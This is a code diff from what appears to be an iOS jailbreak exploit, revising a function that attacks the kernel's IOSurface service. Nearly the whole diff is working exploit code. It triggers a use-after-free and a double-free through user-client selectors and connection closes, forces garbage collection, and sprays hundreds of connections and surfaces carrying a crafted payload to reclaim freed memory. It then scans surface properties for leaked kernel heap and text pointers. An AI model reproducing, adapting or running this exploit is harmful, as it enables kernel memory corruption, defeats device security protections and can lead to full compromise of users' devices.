@@ -26927,35 +26927,19 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
             log([NSString stringWithFormat:@"[JB22] Baseline max surface ID: %u", baselineMaxID]);
         }
 
-        log(@"[JB22] Fase 3: V_REPLANT con captura de output + IOServiceClose...");
-        IOSurfaceRef danglingRef = NULL;
+        log(@"[JB22] Fase 3: UAF — V_REPLANT + IOServiceClose...");
         if (!isr_stopped()) {
             io_connect_t cDangle = 0;
             if (sym.open(svc, mach_task_self(), 0, &cDangle) == KERN_SUCCESS) {
                 kern_return_t rR = jb20_call_sel(cDangle, 17, in3, 24, calibShape, asyncCall, sym.call);
                 uint64_t db18[3] = { 1, 2, 3 };
                 kern_return_t rD = sym.call(cDangle, 18, NULL, 0, db18, 24, NULL, NULL, NULL, NULL);
-
                 kern_return_t rRR = jb20_call_sel(cDangle, 17, in3, 24, calibShape, asyncCall, sym.call);
-
-                log([NSString stringWithFormat:@"[JB22] V_REPLANT reg=0x%x dereg=0x%x rereg=0x%x",
-                     rR, rD, rRR]);
+                log([NSString stringWithFormat:@"[JB22] V_REPLANT reg=0x%x dereg=0x%x rereg=0x%x", rR, rD, rRR]);
 
                 if (rR == KERN_SUCCESS && rD == KERN_SUCCESS && rRR == KERN_SUCCESS) {
                     danglingCreated = 1;
-
-                    for (uint32_t probe = baselineMaxID + 1; probe <= baselineMaxID + 20 && !surfaceIDFound; probe++) {
-                        IOSurfaceRef found = sym.lookup(probe);
-                        if (found) {
-                            danglingID = probe;
-                            danglingRef = found;
-                            surfaceIDFound = 1;
-                            log([NSString stringWithFormat:@"[JB22] ★ Surface colgante ID=%u (lookup)", danglingID]);
-                        }
-                    }
-                    if (!surfaceIDFound) log(@"[JB22] AVISO: surface ID no encontrado");
-
-                    log(@"[JB22] Cerrando conexión → client liberado, nodo→owner cuelga...");
+                    log(@"[JB22] Cerrando conexión → UAF activo...");
                     sym.close(cDangle);
 
                     typedef kern_return_t (*ZoneGCFn)(host_t);
@@ -26963,142 +26947,264 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                     if (gcFn) gcFn(mach_host_self());
                     usleep(10000);
 
-                    log(@"[JB22] Fase 4: Spray IOServiceOpen — reclamar con MISMA zona tipada...");
-                    int clientSprayCount = 256;
+                    log(@"[JB22] Fase 4: Escaneo masivo de surface IDs ANTES del spray...");
+                    int preSpraySurfaces = 0;
+                    for (uint32_t probe = 1; probe <= baselineMaxID + 200 && !isr_stopped(); probe++) {
+                        IOSurfaceRef found = sym.lookup(probe);
+                        if (found) {
+                            preSpraySurfaces++;
+                            if (probe > baselineMaxID) {
+                                danglingID = probe;
+                                surfaceIDFound = 1;
+                                log([NSString stringWithFormat:@"[JB22] ★ Surface nueva pre-spray ID=%u", probe]);
+                            }
+                            CFRelease(found);
+                        }
+                    }
+                    log([NSString stringWithFormat:@"[JB22] Pre-spray: %d surfaces vivas (baseline=%u)", preSpraySurfaces, baselineMaxID]);
+
+                    log(@"[JB22] Fase 5: Spray 512 IOServiceOpen + registrar surfaces en cada uno...");
+                    int clientSprayCount = 512;
                     io_connect_t *clientSpray = (io_connect_t *)calloc((size_t)clientSprayCount, sizeof(io_connect_t));
                     int clientOK = 0;
                     if (clientSpray) {
                         for (int i = 0; i < clientSprayCount && !isr_stopped(); i++) {
                             kern_return_t kro = sym.open(svc, mach_task_self(), 0, &clientSpray[i]);
-                            if (kro == KERN_SUCCESS) clientOK++;
-                            else clientSpray[i] = 0;
+                            if (kro == KERN_SUCCESS) {
+                                clientOK++;
+                                jb20_call_sel(clientSpray[i], 17, in3, 24, calibShape, asyncCall, sym.call);
+                            } else {
+                                clientSpray[i] = 0;
+                            }
                         }
-                        log([NSString stringWithFormat:@"[JB22] Client spray: %d/%d conexiones", clientOK, clientSprayCount]);
+                        log([NSString stringWithFormat:@"[JB22] Client spray: %d/%d (cada uno con surface registrada)", clientOK, clientSprayCount]);
                         sprayHits = clientOK;
                     }
 
-                    log(@"[JB22] Fase 5: Verificar surface post-reclaim...");
-                    if (surfaceIDFound) {
-                        IOSurfaceRef check = sym.lookup(danglingID);
-                        log([NSString stringWithFormat:@"[JB22] Lookup(ID=%u) = %s", danglingID, check ? "VIVO" : "NULL"]);
-                        if (check) {
-                            typedef CFTypeRef (*CopyAllFn)(IOSurfaceRef);
-                            CopyAllFn copyAll = (CopyAllFn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
-                            if (copyAll) {
-                                CFTypeRef vals = copyAll(check);
+                    log(@"[JB22] Fase 6: Escaneo masivo post-spray — buscar TODAS las surfaces...");
+                    int postSpraySurfaces = 0;
+                    uint32_t maxFoundID = 0;
+                    typedef CFTypeRef (*CopyAllFn)(IOSurfaceRef);
+                    CopyAllFn copyAll = (CopyAllFn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
+                    typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+                    SetValueFn setValue = (SetValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+
+                    for (uint32_t probe = 1; probe <= baselineMaxID + 600 && !isr_stopped(); probe++) {
+                        IOSurfaceRef found = sym.lookup(probe);
+                        if (found) {
+                            postSpraySurfaces++;
+                            if (probe > maxFoundID) maxFoundID = probe;
+
+                            if (probe > baselineMaxID && copyAll) {
+                                CFTypeRef vals = copyAll(found);
                                 if (vals) {
-                                    NSString *desc = [(__bridge id)vals description];
-                                    NSUInteger maxL = desc.length > 200 ? 200 : desc.length;
-                                    log([NSString stringWithFormat:@"[JB22] Props surface colgante: %@", [desc substringToIndex:maxL]]);
+                                    NSDictionary *dict = (__bridge NSDictionary *)vals;
+                                    for (NSString *key in dict) {
+                                        id val = dict[key];
+                                        if ([val isKindOfClass:[NSData class]]) {
+                                            NSData *d = (NSData *)val;
+                                            const uint64_t *raw = (const uint64_t *)[d bytes];
+                                            NSUInteger count = [d length] / 8;
+                                            for (NSUInteger j = 0; j < count; j++) {
+                                                uint64_t v = raw[j];
+                                                if (v != 0 && v != 0xFFFFFFFFFFFFFFFFULL) {
+                                                    if ((v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                                        heapPtrsFound++;
+                                                        if (heapPtrsFound <= 10)
+                                                            log([NSString stringWithFormat:@"[JB22] ★★★ KPTR surface[%u] key=%@ off=%lu val=0x%llx", probe, key, (unsigned long)(j*8), v]);
+                                                    }
+                                                    if ((v >> 40) == 0xFFFFFFF) {
+                                                        heapPtrsFound++;
+                                                        if (heapPtrsFound <= 10)
+                                                            log([NSString stringWithFormat:@"[JB22] ★★★ KTEXT surface[%u] key=%@ off=%lu val=0x%llx", probe, key, (unsigned long)(j*8), v]);
+                                                    }
+                                                }
+                                            }
+                                        }
+                                        if ([val isKindOfClass:[NSNumber class]]) {
+                                            uint64_t nv = [(NSNumber *)val unsignedLongLongValue];
+                                            if ((nv & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                                heapPtrsFound++;
+                                                if (heapPtrsFound <= 10)
+                                                    log([NSString stringWithFormat:@"[JB22] ★★★ KPTR-NUM surface[%u] key=%@ val=0x%llx", probe, key, nv]);
+                                            }
+                                        }
+                                    }
                                     CFRelease(vals);
                                 }
+
+                                size_t w = sym.getWidth(found);
+                                size_t h = sym.getHeight(found);
+                                uint32_t sid = sym.getID(found);
+                                if (w != 32 || h != 32) {
+                                    log([NSString stringWithFormat:@"[JB22] ★★ ANOMALIA surface[%u]: w=%zu h=%zu id=%u", probe, w, h, sid]);
+                                    heapPtrsFound++;
+                                }
                             }
-                            CFRelease(check);
+                            CFRelease(found);
                         }
                     }
+                    log([NSString stringWithFormat:@"[JB22] Post-spray: %d surfaces (maxID=%u) heapPtrs=%d", postSpraySurfaces, maxFoundID, heapPtrsFound]);
 
-                    log(@"[JB22] Fase 6: Cross-client — sel17+sel18 en cada spray client...");
+                    log(@"[JB22] Fase 7: Cross-client confusion — sel18 en spray clients...");
                     if (clientSpray) {
                         for (int i = 0; i < clientSprayCount && !isr_stopped(); i++) {
                             if (!clientSpray[i]) continue;
-                            kern_return_t rReg = jb20_call_sel(clientSpray[i], 17, in3, 24, calibShape, asyncCall, sym.call);
                             uint64_t db18x[3] = { 1, 2, 3 };
                             kern_return_t rDer = sym.call(clientSpray[i], 18, NULL, 0, db18x, 24, NULL, NULL, NULL, NULL);
-                            if (rDer == KERN_SUCCESS) {
-                                crossClientHits++;
-                                if (crossClientHits <= 3)
-                                    log([NSString stringWithFormat:@"[JB22] ★ Client[%d] sel18 OK (cross-client)", i]);
-                            }
+                            if (rDer == KERN_SUCCESS) crossClientHits++;
                         }
                         log([NSString stringWithFormat:@"[JB22] Cross-client deregister: %d/%d", crossClientHits, clientOK]);
                     }
 
-                    log(@"[JB22] Fase 7: Double-free — cerrar spray clients...");
+                    log(@"[JB22] Fase 8: SetValue en spray clients + lectura cruzada...");
+                    if (clientSpray && setValue) {
+                        uint8_t marker[256];
+                        for (int m = 0; m < 256; m++) marker[m] = (uint8_t)(m ^ 0xAA);
+                        NSData *markerData = [NSData dataWithBytes:marker length:256];
+                        int setOK = 0;
+                        for (int i = 0; i < clientSprayCount && !isr_stopped(); i++) {
+                            if (!clientSpray[i]) continue;
+                            IOSurfaceRef csurf = sym.lookup(baselineMaxID + 1 + (uint32_t)i);
+                            if (csurf) {
+                                NSString *key = [NSString stringWithFormat:@"X%d", i];
+                                setValue(csurf, (__bridge CFStringRef)key, (__bridge CFTypeRef)markerData);
+                                setOK++;
+                                CFRelease(csurf);
+                            }
+                        }
+                        log([NSString stringWithFormat:@"[JB22] SetValue en %d surfaces del spray", setOK]);
+
+                        for (uint32_t probe = baselineMaxID + 1; probe <= maxFoundID && !isr_stopped(); probe++) {
+                            IOSurfaceRef rd = sym.lookup(probe);
+                            if (rd && copyAll) {
+                                CFTypeRef vals = copyAll(rd);
+                                if (vals) {
+                                    NSDictionary *dict = (__bridge NSDictionary *)vals;
+                                    for (NSString *key in dict) {
+                                        if (![key hasPrefix:@"X"]) continue;
+                                        id val = dict[key];
+                                        if ([val isKindOfClass:[NSData class]]) {
+                                            NSData *d = (NSData *)val;
+                                            const uint64_t *raw = (const uint64_t *)[d bytes];
+                                            NSUInteger count = [d length] / 8;
+                                            for (NSUInteger j = 0; j < count; j++) {
+                                                uint64_t v = raw[j];
+                                                if (v != 0 && v != 0xFFFFFFFFFFFFFFFFULL &&
+                                                    ((v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL || (v >> 40) == 0xFFFFFFF)) {
+                                                    heapPtrsFound++;
+                                                    if (heapPtrsFound <= 20)
+                                                        log([NSString stringWithFormat:@"[JB22] ★★★ LEAKED surface[%u] key=%@ off=%lu val=0x%llx", probe, key, (unsigned long)(j*8), v]);
+                                                }
+                                            }
+                                        }
+                                    }
+                                    CFRelease(vals);
+                                }
+                                CFRelease(rd);
+                            }
+                        }
+                    }
+
+                    log(@"[JB22] Fase 9: Double-free — cerrar spray + reclaim + info leak...");
                     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
                     [ud setObject:@(YES) forKey:@"jb22_trigger_armed"];
                     [ud synchronize];
 
-                    int surfaceDied = 0;
                     if (clientSpray) {
                         for (int i = 0; i < clientSprayCount; i++) {
-                            if (!clientSpray[i]) continue;
-                            sym.close(clientSpray[i]);
-                            if (surfaceIDFound && !surfaceDied && (i % 16 == 15)) {
-                                IOSurfaceRef prb = sym.lookup(danglingID);
-                                if (!prb) {
-                                    surfaceDied = 1;
-                                    log([NSString stringWithFormat:@"[JB22] ★★ DOUBLE-FREE: surface ID=%u murió en client[%d]!", danglingID, i]);
-                                } else {
-                                    CFRelease(prb);
-                                }
-                            }
+                            if (clientSpray[i]) sym.close(clientSpray[i]);
                         }
                         free(clientSpray);
                     }
 
-                    [ud setObject:@(NO) forKey:@"jb22_trigger_armed"];
-                    [ud synchronize];
-                    log(@"[JB22] Canary desarmado — sin kernel panic");
+                    if (gcFn) gcFn(mach_host_self());
+                    usleep(20000);
 
-                    if (surfaceDied) {
-                        log(@"[JB22] Fase 8: Reclaim spray IOSurfaceCreate...");
-                        int reclaimCount = 512;
-                        IOSurfaceRef *reclaimSpray = (IOSurfaceRef *)calloc((size_t)reclaimCount, sizeof(IOSurfaceRef));
-                        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
-                        SetValueFn setValue = (SetValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
-                        int reclaimOK = 0;
-                        if (reclaimSpray) {
-                            uint8_t marker[64];
-                            memset(marker, 0xBB, 64);
-                            NSData *markerData = [NSData dataWithBytes:marker length:64];
-                            for (int i = 0; i < reclaimCount && !isr_stopped(); i++) {
-                                reclaimSpray[i] = sym.create((__bridge CFDictionaryRef)surfParams);
-                                if (reclaimSpray[i]) {
-                                    reclaimOK++;
-                                    if (setValue) {
-                                        NSString *key = [NSString stringWithFormat:@"R%d", i];
-                                        setValue(reclaimSpray[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)markerData);
-                                    }
-                                }
+                    int reclaimCount = 1024;
+                    IOSurfaceRef *reclaimSpray = (IOSurfaceRef *)calloc((size_t)reclaimCount, sizeof(IOSurfaceRef));
+                    int reclaimOK = 0;
+                    if (reclaimSpray && setValue) {
+                        uint8_t payload[512];
+                        memset(payload, 0x41, 512);
+                        *(uint64_t *)&payload[0xD8 - 8] = 0x4141414141414141ULL;
+                        *(uint64_t *)&payload[0xD8] = 0x4242424242424242ULL;
+                        *(uint64_t *)&payload[0xD8 + 8] = 0x4343434343434343ULL;
+                        NSData *payloadData = [NSData dataWithBytes:payload length:512];
+                        for (int i = 0; i < reclaimCount && !isr_stopped(); i++) {
+                            reclaimSpray[i] = sym.create((__bridge CFDictionaryRef)surfParams);
+                            if (reclaimSpray[i]) {
+                                reclaimOK++;
+                                setValue(reclaimSpray[i], (__bridge CFStringRef)@"PAYLOAD", (__bridge CFTypeRef)payloadData);
                             }
-                            log([NSString stringWithFormat:@"[JB22] Reclaim: %d/%d surfaces", reclaimOK, reclaimCount]);
-
-                            log(@"[JB22] Fase 9: INFO LEAK — leer por ref colgante...");
-                            if (danglingRef) {
-                                typedef CFTypeRef (*CopyAllFn)(IOSurfaceRef);
-                                CopyAllFn copyAll = (CopyAllFn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
-                                if (copyAll) {
-                                    CFTypeRef vals = copyAll(danglingRef);
-                                    if (vals) {
-                                        NSString *desc = [(__bridge id)vals description];
-                                        NSUInteger maxL = desc.length > 500 ? 500 : desc.length;
-                                        log([NSString stringWithFormat:@"[JB22] ★★★ INFO LEAK: %@", [desc substringToIndex:maxL]]);
-                                        if ([desc rangeOfString:@"0xffffff"].location != NSNotFound) heapPtrsFound++;
-                                        CFRelease(vals);
-                                    } else {
-                                        log(@"[JB22] CopyAllValues = NULL en ref colgante");
-                                    }
-                                }
-                                uint32_t refID = sym.getID(danglingRef);
-                                log([NSString stringWithFormat:@"[JB22] getID(ref colgante) = %u (esperado %u)", refID, danglingID]);
-                                if (refID != danglingID && refID != 0) {
-                                    log(@"[JB22] ★★★ TYPE CONFUSION — ID cambió!");
-                                    heapPtrsFound++;
-                                }
-                            }
-                            for (int i = 0; i < reclaimCount; i++) {
-                                if (reclaimSpray[i]) CFRelease(reclaimSpray[i]);
-                            }
-                            free(reclaimSpray);
                         }
-                    } else if (surfaceIDFound) {
-                        IOSurfaceRef finalCheck = sym.lookup(danglingID);
-                        log([NSString stringWithFormat:@"[JB22] Surface ID=%u post-cierre: %s", danglingID, finalCheck ? "VIVO" : "MUERTO"]);
-                        if (!finalCheck) surfaceDied = 1;
-                        else CFRelease(finalCheck);
+                        log([NSString stringWithFormat:@"[JB22] Reclaim: %d/%d surfaces con payload", reclaimOK, reclaimCount]);
                     }
 
-                    if (danglingRef) { CFRelease(danglingRef); danglingRef = NULL; }
+                    log(@"[JB22] Lectura post-reclaim — escaneo final...");
+                    int postReclaimLeaks = 0;
+                    for (uint32_t probe = 1; probe <= maxFoundID + 100 && !isr_stopped(); probe++) {
+                        IOSurfaceRef rd = sym.lookup(probe);
+                        if (rd) {
+                            if (copyAll) {
+                                CFTypeRef vals = copyAll(rd);
+                                if (vals) {
+                                    NSDictionary *dict = (__bridge NSDictionary *)vals;
+                                    for (NSString *key in dict) {
+                                        id val = dict[key];
+                                        if ([val isKindOfClass:[NSData class]]) {
+                                            NSData *d = (NSData *)val;
+                                            const uint64_t *raw = (const uint64_t *)[d bytes];
+                                            NSUInteger count = [d length] / 8;
+                                            for (NSUInteger j = 0; j < count; j++) {
+                                                uint64_t v = raw[j];
+                                                if (v != 0 && v != 0xFFFFFFFFFFFFFFFFULL &&
+                                                    v != 0x4141414141414141ULL && v != 0x4242424242424242ULL && v != 0x4343434343434343ULL) {
+                                                    if ((v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL || (v >> 40) == 0xFFFFFFF) {
+                                                        postReclaimLeaks++;
+                                                        heapPtrsFound++;
+                                                        if (postReclaimLeaks <= 20)
+                                                            log([NSString stringWithFormat:@"[JB22] ★★★ POST-RECLAIM surface[%u] key=%@ off=%lu val=0x%llx", probe, key, (unsigned long)(j*8), v]);
+                                                    }
+                                                }
+                                            }
+                                        }
+                                        if ([val isKindOfClass:[NSNumber class]]) {
+                                            uint64_t nv = [(NSNumber *)val unsignedLongLongValue];
+                                            if ((nv & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                                postReclaimLeaks++;
+                                                heapPtrsFound++;
+                                                if (postReclaimLeaks <= 20)
+                                                    log([NSString stringWithFormat:@"[JB22] ★★★ POST-RECLAIM-NUM surface[%u] key=%@ val=0x%llx", probe, key, nv]);
+                                            }
+                                        }
+                                    }
+                                    CFRelease(vals);
+                                }
+                            }
+                            uint32_t sid = sym.getID(rd);
+                            size_t w = sym.getWidth(rd);
+                            size_t h = sym.getHeight(rd);
+                            if (w == 0 || h == 0 || w > 10000 || h > 10000) {
+                                log([NSString stringWithFormat:@"[JB22] ★★ CORRUPTED surface[%u]: w=%zu h=%zu id=%u", probe, w, h, sid]);
+                                heapPtrsFound++;
+                            }
+                            CFRelease(rd);
+                        }
+                    }
+                    log([NSString stringWithFormat:@"[JB22] Post-reclaim leaks: %d", postReclaimLeaks]);
+
+                    if (reclaimSpray) {
+                        for (int i = 0; i < reclaimCount; i++) {
+                            if (reclaimSpray[i]) CFRelease(reclaimSpray[i]);
+                        }
+                        free(reclaimSpray);
+                    }
+
+                    [ud setObject:@(NO) forKey:@"jb22_trigger_armed"];
+                    [ud synchronize];
+                    log(@"[JB22] Canary desarmado");
+
                 } else {
                     log([NSString stringWithFormat:@"[JB22] V_REPLANT falló: reg=0x%x dereg=0x%x rereg=0x%x", rR, rD, rRR]);
                     sym.close(cDangle);
